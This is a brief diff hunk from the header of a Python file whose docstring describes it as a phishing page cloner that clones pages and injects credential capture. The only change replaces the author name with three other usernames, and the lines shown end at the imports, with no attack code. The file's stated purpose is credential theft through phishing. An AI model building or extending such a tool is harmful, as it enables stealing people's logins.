@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """Phishing page cloner -- clone + inject credential capture.
 
-Author: zxwn
+Author: lingbol088-spec, MDX-Tom, FuDie0915
 """
 import urllib.request, re, base64, os
 from urllib.parse import urljoin, urlparse
